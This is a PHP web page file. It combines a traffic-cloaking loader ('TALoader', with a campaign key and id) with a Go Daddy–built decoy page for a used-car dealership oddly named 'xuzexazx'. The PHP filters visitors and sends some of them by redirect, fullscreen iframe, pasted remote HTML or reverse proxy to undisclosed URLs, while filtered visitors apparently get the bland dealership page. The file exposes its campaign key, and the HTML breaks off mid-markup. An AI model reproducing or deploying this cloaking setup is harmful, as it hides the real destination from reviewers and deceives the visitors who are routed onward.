
<?php
$GLOBALS['_ta_campaign_key'] = '444b212ac0952f218b9c5d2a230088cb';
$GLOBALS['_ta_debug_mode'] = false; //To enable debug mode, set to true or load this script with a '?debug_key=444b212ac0952f218b9c5d2a230088cb' parameter

require 'bootloader.php';

$campaign_id = 'hd5m21';

$ta = new TALoader($campaign_id);


if ($ta->suppress_response()) {//Do not send any output when hybrid mode is enabled and a visitor is being filtered (after hybrid page was generated)
    exit;
}

$response = $ta->get_response();
$visitor = $ta->get_visitor();

/*
 * Advanced users: uncomment lines below during development to expose variables you may want to use in your custom code:
 */
//print_r($response);
//print_r($visitor);
//exit;
/*
 * Don't forget to re-comment the lines above before sending live traffic
 */

/*
Note: when using hybrid mode, please use one of our built-in functions as your final step when routing your visitors:
    print header_redirect("http://url.com"); //performs a 302 header redirect (or a window.location=xxx in JS)
    print load_fullscreen_iframe("http://url.com"); //Loads a fullscreen iframe of the specified URL
    print paste_html("http://url.com"); //Downloads HTML in specified URL and outputs it to the screen (uses JS to insert the HTML in hybrid mode)
(These functions will automatically output either regular HTML or JS code depending on what the visitor's browser is expecting)
*/

switch ($response['action']) {
    case 'header_redirect':
        print header_redirect($response['url']); //Uses <script>window.location='xxx'</script> when in hybrid mode (required behaviour)
        exit;
    case 'iframe':
        print load_fullscreen_iframe($response['url']);
        exit;
    case 'paste_html':
        print paste_html($response['output_html']);
        exit;
    case 'reverse_proxy':
        print reverse_proxy($response['url'], "tarp_5af0220b9cc8621307a5e7cccde642f8/");
        exit;        
    /* Please be VERY CAREFUL if modifying this block: */
    case 'load_hybrid_page':
        $ta->load_hybrid_page();
        break;
    /* ...it is needed for hybrid mode to function correctly */
    default:
        print other_methods($response['url']);
        break;    
}
/*
 * Note: if using the "Remain on Fail URL" action for Filtered Visitors, append your Fail URL's HTML/PHP code after the closing PHP tag below:
 */
?>


<!DOCTYPE html><html lang="en-US"><head><meta charSet="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1"/><title>xuzexazx</title><meta name="author" content="xuzexazx"/><meta name="generator" content="Starfield Technologies; Go Daddy Website Builder 8.0.0000"/><link rel="manifest" href="/manifest.webmanifest"/><link rel="apple-touch-icon" sizes="57x57" href="//img1.wsimg.com/isteam/ip/static/pwa-app/logo-default.png/:/rs=w:57,h:57,m"/><link rel="apple-touch-icon" sizes="60x60" href="//img1.wsimg.com/isteam/ip/static/pwa-app/logo-default.png/:/rs=w:60,h:60,m"/><link rel="apple-touch-icon" sizes="72x72" href="//img1.wsimg.com/isteam/ip/static/pwa-app/logo-default.png/:/rs=w:72,h:72,m"/><link rel="apple-touch-icon" sizes="114x114" href="//img1.wsimg.com/isteam/ip/static/pwa-app/logo-default.png/:/rs=w:114,h:114,m"/><link rel="apple-touch-icon" sizes="120x120" href="//img1.wsimg.com/isteam/ip/static/pwa-app/logo-default.png/:/rs=w:120,h:120,m"/><link rel="apple-touch-icon" sizes="144x144" href="//img1.wsimg.com/isteam/ip/static/pwa-app/logo-default.png/:/rs=w:144,h:144,m"/><link rel="apple-touch-icon" sizes="152x152" href="//img1.wsimg.com/isteam/ip/static/pwa-app/logo-default.png/:/rs=w:152,h:152,m"/><link rel="apple-touch-icon" sizes="180x180" href="//img1.wsimg.com/isteam/ip/static/pwa-app/logo-default.png/:/rs=w:180,h:180,m"/><meta property="og:url" content="https://xuzexazx.appspot.com/"/>
<meta property="og:site_name" content="xuzexazx"/>
<meta property="og:title" content="Quality Cars, Quality Care"/>
<meta property="og:type" content="website"/>
<meta property="og:image" content="http://img1.wsimg.com/isteam/stock/5459"/>
<meta property="og:locale" content="en_US"/>
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="xuzexazx"/>
<meta name="twitter:description" content="Quality Cars, Quality Care"/>
<meta name="twitter:image" content="http://img1.wsimg.com/isteam/stock/5459"/>
<meta name="twitter:image:alt" content="xuzexazx"/>
<meta name="theme-color" content="#839ed5"/><script type="text/javascript" src="https://img1.wsimg.com/poly/v2/polyfill.min.js?unknown=polyfill&amp;flags=gated&amp;features=default%2Cfetch%2CArray.prototype.%40%40iterator%2CArray.prototype.find%2CArray.prototype.findIndex%2CFunction.name%2CNumber.isFinite%2CPromise%2CString.prototype.repeat%2CMath.sign%2CMath.trunc%2CArray.prototype.includes%2CObject.entries%2CObject.values%2CObject.is%2CIntersectionObserver%2CIntl.~locale.en-US" crossorigin></script>
<script type="text/javascript" src="//img1.wsimg.com/blobby/go/gpub/79fb68164481d54f/script.js" crossorigin></script>
<script type="text/javascript">"undefined"===typeof _trfq&&(window._trfq=[]);"undefined"==typeof _trfd&&(window._trfd=[]);</script>
<script type="text/javascript">function trackingEnabledForType(t){return!("undefined"!=typeof document&&"click"===t&&!Boolean(window._allowCT))||(window._allowCT=-1!==document.cookie.indexOf("cookie_terms_accepted"),window._allowCT)}function logTcclEvent(){var e=this.getAttribute("data-tccl");if(window._trfq&&e)try{var t=e.split(","),n=t[0],o=t[1];if(!trackingEnabledForType(o))return;for(var d=t.splice(2),r=[],c=0;c<d.length;c+=2)r.push([d[c],d[c+1]]);window._trfq.push(["cmdLogEvent",o,n,r])}catch(t){window._trfq.push(["cmdLogEvent","gc_published_site_error","tccl.published.log",[["error",t.toString()],["data",e]]])}}"undefined"!=typeof window&&"undefined"!=typeof document&&window.addEventListener("DOMContentLoaded",function(){for(var t=document.querySelectorAll("[data-tccl]"),e=0;e<t.length;e++)try{var n=t[e].getAttribute("data-tccl").split(",");t[e].addEventListener(n[1],logTcclEvent)}catch(t){window._trfq.push(["cmdLogEvent","gc_published_site_error","tccl.published.add",[["error",t.toString()]]])}});</script>
<script type="text/javascript">"use strict";

if ('serviceWorker' in navigator) {
  window.addEventListener('load', function () {
    navigator.serviceWorker.register('/sw.js').then(function () {
      console.log('sw: registration complete');
    }).catch(function (err) {
      console.log(err);
    });
  });
}</script>
<style type="text/css">/*
Copyright 2016 The Cabin Project Authors (impallari@gmail.com)

This Font Software is licensed under the SIL Open Font License, Version 1.1.
This license is copied below, and is also available with a FAQ at: http://scripts.sil.org/OFL

—————————————————————————————-
SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
—————————————————————————————-
*/
/* vietnamese */
@font-face {
  font-family: 'Cabin';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: local('Cabin Bold'), local('Cabin-Bold'), url(https://img1.wsimg.com/gfonts/s/cabin/v14/u-480qWljRw-PdeL2uhquylEeQ5JZ-Y.woff2) format('woff2');
  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Cabin';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: local('Cabin Bold'), local('Cabin-Bold'), url(https://img1.wsimg.com/gfonts/s/cabin/v14/u-480qWljRw-PdeL2uhruylEeQ5JZ-Y.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Cabin';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: local('Cabin Bold'), local('Cabin-Bold'), url(https://img1.wsimg.com/gfonts/s/cabin/v14/u-480qWljRw-PdeL2uhluylEeQ5J.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

/*
Copyright (c) 2010-2011 by tyPoland Lukasz Dziedzic (team@latofonts.com) with Reserved Font Name "Lato". Licensed under the SIL Open Font License, Version 1.1.

This Font Software is licensed under the SIL Open Font License, Version 1.1.
This license is copied below, and is also available with a FAQ at: http://scripts.sil.org/OFL

—————————————————————————————-
SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
—————————————————————————————-
*/
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: italic;
  font-weight: 400;
  font-display: swap;
  src: local('Lato Italic'), local('Lato-Italic'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u8w4BMUTPHjxsAUi-qNiXg7eU0.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: italic;
  font-weight: 400;
  font-display: swap;
  src: local('Lato Italic'), local('Lato-Italic'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u8w4BMUTPHjxsAXC-qNiXg7Q.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: italic;
  font-weight: 700;
  font-display: swap;
  src: local('Lato Bold Italic'), local('Lato-BoldItalic'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u_w4BMUTPHjxsI5wq_FQftx9897sxZ.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: italic;
  font-weight: 700;
  font-display: swap;
  src: local('Lato Bold Italic'), local('Lato-BoldItalic'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u_w4BMUTPHjxsI5wq_Gwftx9897g.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 100;
  font-display: swap;
  src: local('Lato Hairline'), local('Lato-Hairline'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u8w4BMUTPHh30AUi-qNiXg7eU0.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 100;
  font-display: swap;
  src: local('Lato Hairline'), local('Lato-Hairline'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u8w4BMUTPHh30AXC-qNiXg7Q.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 300;
  font-display: swap;
  src: local('Lato Light'), local('Lato-Light'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u9w4BMUTPHh7USSwaPGQ3q5d0N7w.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 300;
  font-display: swap;
  src: local('Lato Light'), local('Lato-Light'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u9w4BMUTPHh7USSwiPGQ3q5d0.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: local('Lato Regular'), local('Lato-Regular'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6uyw4BMUTPHjxAwXiWtFCfQ7A.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: local('Lato Regular'), local('Lato-Regular'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6uyw4BMUTPHjx4wXiWtFCc.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: local('Lato Bold'), local('Lato-Bold'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u9w4BMUTPHh6UVSwaPGQ3q5d0N7w.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: local('Lato Bold'), local('Lato-Bold'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u9w4BMUTPHh6UVSwiPGQ3q5d0.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 900;
  font-display: swap;
  src: local('Lato Black'), local('Lato-Black'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u9w4BMUTPHh50XSwaPGQ3q5d0N7w.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 900;
  font-display: swap;
  src: local('Lato Black'), local('Lato-Black'), url(https://img1.wsimg.com/gfonts/s/lato/v16/S6u9w4BMUTPHh50XSwiPGQ3q5d0.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
</style>
<link rel="stylesheet" href="//img1.wsimg.com/blobby/go/9233ab79-a97e-4a45-8de9-bfc5bd6fd667/gpub/8396e10278a51439/styles.css"/>
<link data-glamor="cxs-default-sheet" rel="stylesheet" href="//img1.wsimg.com/blobby/go/9233ab79-a97e-4a45-8de9-bfc5bd6fd667/gpub/56dbfaac3c59ff28/styles.css"/>
<style data-glamor="cxs-media-sheet" type="text/css"></style>
<style data-glamor="cxs-xs-sheet" type="text/css">@media (max-width: 767px){.x .c1-r{padding-top:40px}}@media (max-width: 767px){.x .c1-s{padding-bottom:40px}}@media (max-width: 767px){.x .c1-1j{width:auto}}@media (max-width: 767px){.x .c1-4i > :nth-child(n){margin-bottom:16px}}@media (max-width: 767px){.x .c1-4j  > :last-child{margin-bottom:0 !important}}@media (max-width: 767px){.x .c1-78{margin-top:0px}}@media (max-width: 767px){.x .c1-79{margin-bottom:0px}}@media (max-width: 767px){.x .c1-7a{font-size:12px}}</style>
<link data-glamor="cxs-sm-sheet" rel="stylesheet" href="//img1.wsimg.com/blobby/go/9233ab79-a97e-4a45-8de9-bfc5bd6fd667/gpub/81f1cd326241a02c/styles.css"/>
<link data-glamor="cxs-md-sheet" rel="stylesheet" href="//img1.wsimg.com/blobby/go/9233ab79-a97e-4a45-8de9-bfc5bd6fd667/gpub/ce00c1a652584dc2/styles.css"/>
<style data-glamor="cxs-lg-sheet" type="text/css">@media (min-width: 1280px){.x .c1-f{font-size:16px}}@media (min-width: 1280px){.x .c1-17{width:1160px}}@media (min-width: 1280px){.x .c1-2b{font-size:32px}}@media (min-width: 1280px){.x .c1-2n{font-size:44px}}@media (min-width: 1280px){.x .c1-2s{font-size:22px}}@media (min-width: 1280px){.x .c1-6r{font-size:14px}}</style>
<style data-glamor="cxs-xl-sheet" type="text/css">@media (min-width: 1536px){.x .c1-g{font-size:18px}}@media (min-width: 1536px){.x .c1-18{width:1280px}}@media (min-width: 1536px){.x .c1-2c{font-size:36px}}@media (min-width: 1536px){.x .c1-2o{font-size:48px}}@media (min-width: 1536px){.x .c1-2t{font-size:24px}}@media (min-width: 1536px){.x .c1-6s{font-size:16px}}</style>
<style type="text/css">.page-inner { background-color: rgb(22, 22, 22); min-height: 100vh; }</style></head>
<body class="x  x-fonts-cabin" context="[object Object]"><div id="layout-9233-ab-79-a-97-e-4-a-45-8-de-9-bfc-5-bd-6-fd-667" class="layout layout-layout layout-layout-layout-16 locale-en-US lang-en"><div data-ux="Page" id="page-124859" class="x-el x-el-div x-el c1-1 c1-2 c1-3 c1-4 c1-5 c1-6 c1-7 c1-8 c1-9 c1-a c1-b c1-c c1-d c1-e c1-f c1-g c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div data-ux="Block" class="x-el x-el-div page-inner c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div id="332e3eac-00db-46ff-b558-919c4bbb1074" class="widget widget-header widget-header-header-9"><div data-ux="Header" role="main" data-aid="HEADER_WIDGET" class="x-el x-el-div x-el x-el c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g c1-1 c1-2 c1-h c1-b c1-c c1-d c1-e c1-f c1-g c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div> <section data-ux="Section" data-aid="HEADER_SECTION" class="x-el x-el-section c1-1 c1-2 c1-h c1-i c1-j c1-k c1-l c1-m c1-n c1-o c1-p c1-q c1-b c1-c c1-r c1-s c1-d c1-e c1-f c1-g"><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-t c1-b c1-c c1-d c1-u c1-e c1-f c1-g"></div><div data-ux="Block" id="header_parallax124862" class="x-el x-el-div c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div id="bs-1"></div></div><div data-ux="Container" class="x-el x-el-div c1-1 c1-2 c1-v c1-w c1-x c1-y c1-z c1-10 c1-11 c1-12 c1-13 c1-4 c1-b c1-c c1-14 c1-d c1-15 c1-16 c1-e c1-17 c1-f c1-18 c1-g"><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-19 c1-b c1-c c1-d c1-e c1-f c1-g"><div data-ux="Block" data-aid="HEADER_LOGO_RENDERED" class="x-el x-el-div c1-1a c1-1b c1-19 c1-1c c1-1d c1-1e c1-1f c1-1g c1-x c1-y c1-3 c1-1h c1-11 c1-1i c1-c c1-1j c1-1k c1-1l c1-d c1-e c1-f c1-g"><a rel="" role="link" aria-haspopup="menu" data-ux="Link" data-page="a9f148e7-6b12-4d36-95f0-1b4a4be338a5" title="xuzexazx" href="/" data-typography="LinkAlpha" class="x-el x-el-a c1-1m c1-1n c1-1o c1-1p c1-1q c1-1r c1-1s c1-1t c1-1u c1-1v c1-1w c1-z c1-b c1-1x c1-c c1-1y c1-1z c1-20 c1-d c1-e c1-f c1-g" data-tccl="ux2.HEADER.header9.Logo.Default.Link.Default.124863.click,click"><div data-ux="Block" id="logo-container-124864" class="x-el x-el-div c1-1 c1-2 c1-19 c1-4 c1-12 c1-11 c1-b c1-c c1-d c1-e c1-f c1-g"><h3 role="heading" aria-level="3" data-ux="LogoHeading" id="logo-text-124865" data-aid="HEADER_LOGO_TEXT_RENDERED" data-typography="HeadingBeta" class="x-el x-el-h3 c1-1a c1-1b c1-1p c1-1q c1-21 c1-22 c1-23 c1-24 c1-25 c1-z c1-19 c1-1c c1-26 c1-27 c1-28 c1-29 c1-2a c1-2b c1-2c">xuzexazx</h3><span role="heading" aria-level="NaN" data-ux="scaler" data-size="xxlarge" data-scaler-id="scaler-logo-container-124864" aria-hidden="true" data-typography="HeadingBeta" class="x-el x-el-span c1-1a c1-1b c1-2d c1-2e c1-21 c1-22 c1-23 c1-24 c1-25 c1-z c1-2f c1-2g c1-2h c1-2i c1-2j c1-2k c1-1c c1-27 c1-28 c1-2l c1-2m c1-2n c1-2o">xuzexazx</span><span role="heading" aria-level="NaN" data-ux="scaler" data-size="xlarge" data-scaler-id="scaler-logo-container-124864" aria-hidden="true" data-typography="HeadingBeta" class="x-el x-el-span c1-1a c1-1b c1-2d c1-2e c1-21 c1-22 c1-23 c1-24 c1-25 c1-z c1-2f c1-2g c1-2h c1-2i c1-2j c1-26 c1-1c c1-27 c1-28 c1-29 c1-2a c1-2b c1-2c">xuzexazx</span><span role="heading" aria-level="NaN" data-ux="scaler" data-size="large" data-scaler-id="scaler-logo-container-124864" aria-hidden="true" data-typography="HeadingBeta" class="x-el x-el-span c1-1a c1-1b c1-2d c1-2e c1-21 c1-22 c1-23 c1-24 c1-25 c1-z c1-2f c1-2g c1-2h c1-2i c1-2j c1-2p c1-1c c1-27 c1-28 c1-2q c1-2r c1-2s c1-2t">xuzexazx</span><div id="bs-2"></div></div></a></div></div></div><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-2u c1-b c1-c c1-d c1-e c1-f c1-g"><div data-ux="Block" id="header_parallax124866" class="x-el x-el-div c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div id="bs-3"></div><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-12 c1-4 c1-b c1-c c1-d c1-e c1-f c1-g"><div data-ux="HeaderMedia" class="x-el x-el-div c1-1 c1-2 c1-12 c1-2v c1-b c1-c c1-d c1-e c1-f c1-g"><div id="guacBg124867" role="img" data-guac-image="loading" data-ux="Background" data-aid="BACKGROUND_IMAGE_RENDERED" overlay="none" treatment="Fill" data-ht="Fill" treatmentData="[object Object]" class="x-el x-el-div c1-1 c1-2 c1-2w c1-2x c1-2y c1-2z c1-30 c1-4 c1-31 c1-32 c1-33 c1-b c1-c c1-d c1-34 c1-e c1-f c1-g"><script>Number(window.vctElements)||(window.vctElements=0),window.vctElements++;new guacImage("//img1.wsimg.com/isteam/stock/5459/:/rs=w:{width},h:{height},cg:true,m/cr=w:{width},h:{height},a:cc",document.getElementById('guacBg124867'),{"shouldMarkVisuallyComplete":true})</script></div></div></div></div></div><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-4 c1-35 c1-3 c1-b c1-c c1-d c1-e c1-f c1-g"><div data-ux="Hero" class="x-el x-el-div c1-1 c1-2 c1-36 c1-37 c1-38 c1-39 c1-11 c1-3a c1-3b c1-3c c1-b c1-c c1-d c1-3d c1-3e c1-3f c1-e c1-f c1-g"><div data-ux="Element" id="tagline-container-124868" class="x-el x-el-div c1-1 c1-2 c1-1p c1-1q c1-21 c1-t c1-12 c1-z c1-b c1-c c1-d c1-e c1-f c1-g"><h1 role="heading" aria-level="1" data-ux="Tagline" data-aid="HEADER_TAGLINE_RENDERED" id="dynamic-tagline-124869" data-typography="BodyBeta" class="x-el x-el-h1 c1-1 c1-2 c1-1p c1-1q c1-3g c1-22 c1-23 c1-24 c1-25 c1-3h c1-z c1-19 c1-b c1-3i c1-2p c1-3j c1-2q c1-3k c1-3l c1-3m c1-2r c1-2s c1-2t">Quality Cars, Quality Care</h1><span role="heading" aria-level="NaN" data-ux="scaler" data-size="large" data-scaler-id="scaler-tagline-container-124868" aria-hidden="true" data-typography="BodyBeta" class="x-el x-el-span c1-1 c1-2 c1-2d c1-2e c1-3g c1-22 c1-23 c1-24 c1-25 c1-3h c1-z c1-2f c1-2g c1-2h c1-2i c1-2j c1-2p c1-b c1-3i c1-3j c1-2q c1-3k c1-3l c1-3m c1-2r c1-2s c1-2t">Quality Cars, Quality Care</span><span role="heading" aria-level="NaN" data-ux="scaler" data-size="medium" data-scaler-id="scaler-tagline-container-124868" aria-hidden="true" data-typography="BodyBeta" class="x-el x-el-span c1-1 c1-2 c1-2d c1-2e c1-3g c1-22 c1-23 c1-24 c1-25 c1-3h c1-z c1-2f c1-2g c1-2h c1-2i c1-2j c1-c c1-b c1-3i c1-3j c1-d c1-3k c1-3l c1-3m c1-e c1-f c1-g">Quality Cars, Quality Care</span><div id="bs-4"></div></div></div></div></section> </div></div></div><div id="48f5be3e-b678-405b-89a5-442b053988c0" class="widget widget-about widget-about-about-2"><div data-ux="Widget" role="region" class="x-el x-el-div x-el c1-1 c1-2 c1-3 c1-b c1-c c1-d c1-e c1-f c1-g c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div> <section data-ux="Section" class="x-el x-el-section c1-1 c1-2 c1-3 c1-i c1-j c1-k c1-l c1-m c1-n c1-o c1-p c1-b c1-c c1-r c1-s c1-d c1-e c1-f c1-g"><div data-ux="Container" class="x-el x-el-div c1-1 c1-2 c1-v c1-w c1-x c1-y c1-z c1-b c1-c c1-14 c1-d c1-15 c1-e c1-17 c1-f c1-18 c1-g"><h1 role="heading" aria-level="1" data-ux="SectionHeading" data-aid="ABOUT_SECTION_TITLE_RENDERED" data-promoted-from="2" data-order="0" data-typography="HeadingBeta" class="x-el x-el-h1 c1-1a c1-1b c1-1p c1-1q c1-3n c1-22 c1-23 c1-24 c1-3o c1-2u c1-11 c1-1c c1-26 c1-27 c1-28 c1-29 c1-16 c1-2a c1-2b c1-2c"><span data-ux="Element" class="">About Us</span></h1><div data-ux="Grid" class="x-el x-el-div c1-1 c1-2 c1-36 c1-3s c1-3t c1-3u c1-24 c1-3v c1-3w c1-3x c1-b c1-c c1-3y c1-3z c1-40 c1-41 c1-d c1-e c1-f c1-g"><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-2v c1-42 c1-43 c1-z c1-44 c1-45 c1-46 c1-47 c1-b c1-c c1-48 c1-49 c1-4a c1-4b c1-d c1-e c1-f c1-g"><div data-ux="Grid" class="x-el x-el-div c1-1 c1-2 c1-36 c1-3s c1-3t c1-3u c1-24 c1-3v c1-25 c1-3x c1-39 c1-b c1-c c1-3y c1-3z c1-4c c1-41 c1-d c1-e c1-f c1-g"><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-2v c1-42 c1-43 c1-z c1-44 c1-45 c1-4d c1-47 c1-36 c1-39 c1-38 c1-b c1-c c1-4e c1-4f c1-48 c1-49 c1-4g c1-4b c1-d c1-e c1-f c1-g"><div data-ux="ContentBasic" index="0" id="26310f30-9a35-45c1-857d-4591f106d6d6" class="x-el x-el-div x-el c1-1 c1-2 c1-36 c1-37 c1-4 c1-4h c1-38 c1-11 c1-3a c1-3b c1-b c1-c c1-4i c1-4j c1-d c1-e c1-f c1-g c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><h4 role="heading" aria-level="4" data-ux="ContentHeading" data-aid="ABOUT_HEADLINE_RENDERED0" data-typography="HeadingDelta" class="x-el x-el-h4 c1-1 c1-2 c1-1p c1-1q c1-3g c1-22 c1-23 c1-24 c1-25 c1-b c1-4k c1-2p c1-3j c1-2q c1-2r c1-2s c1-2t">Top Used Vehicles</h4><div data-ux="ContentText" alignment="center" data-aid="ABOUT_DESCRIPTION_RENDERED0" data-typography="BodyAlpha" class="x-el x-el-p c1-1 c1-2 c1-1p c1-1q c1-4l c1-24 c1-25 c1-4m c1-4n c1-4o c1-4p c1-4q c1-4r c1-4s c1-4t c1-4u c1-4v c1-4w c1-4x c1-4y c1-4z c1-50 c1-51 c1-52 c1-53 c1-54 c1-55 c1-56 c1-57 c1-58 c1-59 c1-5a c1-5b c1-5c c1-5d c1-2v c1-b c1-3i c1-c c1-3j c1-d c1-e c1-f c1-g x-rt"><p style="margin:0"><span class="x-el x-el-span c1-5j c1-5k c1-b c1-c c1-d c1-e c1-f c1-g">At our dealership, we stock our lot with pre-owned vehicles. We service our own vehicles to make sure they are in road-ready shape. Interested in our of our vehicles? Ask for a test drive!</span></p></div></div></div></div></div><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-2v c1-42 c1-43 c1-z c1-44 c1-45 c1-46 c1-47 c1-b c1-c c1-48 c1-49 c1-4a c1-4b c1-d c1-e c1-f c1-g"><div data-ux="Grid" class="x-el x-el-div c1-1 c1-2 c1-36 c1-3s c1-3t c1-3u c1-24 c1-3v c1-25 c1-3x c1-39 c1-b c1-c c1-3y c1-3z c1-4c c1-41 c1-d c1-e c1-f c1-g"><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-2v c1-42 c1-43 c1-z c1-44 c1-45 c1-4d c1-47 c1-36 c1-39 c1-38 c1-b c1-c c1-4e c1-4f c1-48 c1-49 c1-4g c1-4b c1-d c1-e c1-f c1-g"><div data-ux="ContentBasic" index="1" id="762ac567-e356-4c23-938d-e6be21c29258" class="x-el x-el-div x-el c1-1 c1-2 c1-36 c1-37 c1-4 c1-4h c1-38 c1-11 c1-3a c1-3b c1-b c1-c c1-4i c1-4j c1-d c1-e c1-f c1-g c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><h4 role="heading" aria-level="4" data-ux="ContentHeading" data-aid="ABOUT_HEADLINE_RENDERED1" data-typography="HeadingDelta" class="x-el x-el-h4 c1-1 c1-2 c1-1p c1-1q c1-3g c1-22 c1-23 c1-24 